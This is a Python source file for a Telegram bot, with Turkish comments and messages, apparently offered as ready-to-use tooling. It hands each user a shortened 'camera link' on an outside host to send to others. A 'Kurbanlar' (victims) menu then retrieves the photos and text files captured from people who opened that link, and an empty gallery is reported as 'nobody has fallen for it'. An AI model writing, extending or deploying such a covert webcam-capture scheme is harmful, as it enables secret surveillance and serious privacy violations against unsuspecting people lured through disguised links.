import telebot
import os
import string
import requests
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

BOT_TOKEN = "{BOT_TOKEN}"
CHANNEL_LINK = "{CHANNEL_LINK}"
CHANNEL_ID = "{CHANNEL_ID}"
OWNER_USERNAME = "{OWNER_USERNAME}"

def shorten_url(long_url):
    api = "https://is.gd/create.php"
    params = {
        "format": "json",
        "url": long_url
    }
    try:
        r = requests.get(api, params=params, timeout=5)
        data = r.json()
        return data.get("shorturl", long_url)
    except:
        return long_url

# ================== AYARLAR ==================

TOKEN = "{BOT_TOKEN}"   # 🔴 DEĞİŞTİR

BASE_URL = "https://ghosturl.ct.ws"  # 🔴 DEĞİŞTİR
DATA_PATH = "./data"                # gerekirse değiştir

# 🔒 GİZLİ KANALLAR
CHANNELS = [
    {"id": -1002571650878, "link": "https://t.me/+bGWIvUJh0XgyYWM0"},
    {"id": {CHANNEL_ID}, "link": "{CHANNEL_LINK}"},

]

# ============================================

bot = telebot.TeleBot(TOKEN, parse_mode="HTML")

# ────────────────────────────────────────────
def joined_all(user_id):
    for ch in CHANNELS:
        try:
            m = bot.get_chat_member(ch["id"], user_id)
            if m.status not in ("member", "administrator", "creator"):
                return False
        except:
            return False
    return True

# ────────────────────────────────────────────
def send_join_menu(uid):
    kb = InlineKeyboardMarkup(row_width=2)

    for i, ch in enumerate(CHANNELS, start=1):
        kb.add(
            InlineKeyboardButton(f"📢 Kanal {i}", url=ch["link"])
        )

    kb.add(
        InlineKeyboardButton("✅ Katıldım / Kontrol Et", callback_data="check_join")
    )

    bot.send_message(
        uid,
        "❗ <b>Devam etmek için kanallara katılmalısın</b>",
        reply_markup=kb
    )

# ────────────────────────────────────────────
def send_main_menu(uid):
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("📷 Kamera", callback_data="camera"),
        InlineKeyboardButton("Kurbanlar", callback_data="gallery")
    )

    bot.send_message(
        uid,
        "👋 Hoş geldin\n Bu Botun Kurucusu {OWNER_USERNAME} Sorun olursa yazın.",
        reply_markup=kb
    )
    
@bot.callback_query_handler(func=lambda call: call.data == "camera")
def camera_handler(call):
    uid = call.from_user.id

    long_link = f"https://ghosturl.ct.ws/a.php?id={uid}"
    short_link = shorten_url(long_link)

    bot.send_message(
        uid,
        f"📷 <b>Kamera Linkin (Telegramdan açarsa çalışmaz)</b>\n\n{short_link}",
        parse_mode="HTML"
    )
# ────────────────────────────────────────────
@bot.message_handler(commands=["start"])
def start(msg):
    uid = msg.from_user.id

    if joined_all(uid):
        send_main_menu(uid)
    else:
        send_join_menu(uid)

# ────────────────────────────────────────────
@bot.callback_query_handler(func=lambda c: c.data == "check_join")
def check_join(call):
    uid = call.from_user.id

    if joined_all(uid):
        bot.answer_callback_query(call.id, "✅ Katılım doğrulandı")
        send_main_menu(uid)
    else:
        bot.answer_callback_query(
            call.id,
            "❌ Tüm kanallara katılmadın",
            show_alert=True
        )

# ────────────────────────────────────────────
@bot.callback_query_handler(func=lambda call: call.data == "gallery")
def gallery_handler(call):
    uid = call.from_user.id
    base_url = f"https://ghosturl.ct.ws/data/{uid}/"
    sent_any = False

    for letter in "abcdefghijklmnopqrstuvwxyz":
        img_url = base_url + f"{letter}.png"
        txt_url = base_url + f"{letter}.txt"

        try:
            headers = {'User-Agent': 'Mozilla/5.0'}
            img_resp = requests.get(img_url, headers=headers, timeout=5)
            txt_resp = requests.get(txt_url, headers=headers, timeout=5)
        except requests.exceptions.RequestException:
            break

        # Dosya yoksa döngüyü kır
        if img_resp.status_code != 200:
            break

        # txt dosyası yoksa uyarı yaz
        if txt_resp.status_code == 200 and 'html' not in txt_resp.text.lower():
            txt_content = txt_resp.text[:1024]
        else:
            txt_content = "FOTO ÇEKİLDİ"

        # Foto + caption gönder
        bot.send_photo(
            uid,
            img_url,
            caption=txt_content,
            parse_mode=None  # HTML parse etmeyi kapattık
        )
        sent_any = True

    if not sent_any:
        bot.send_message(uid, "Kimse Düşmemiş.")

# ────────────────────────────────────────────
bot.infinity_polling()
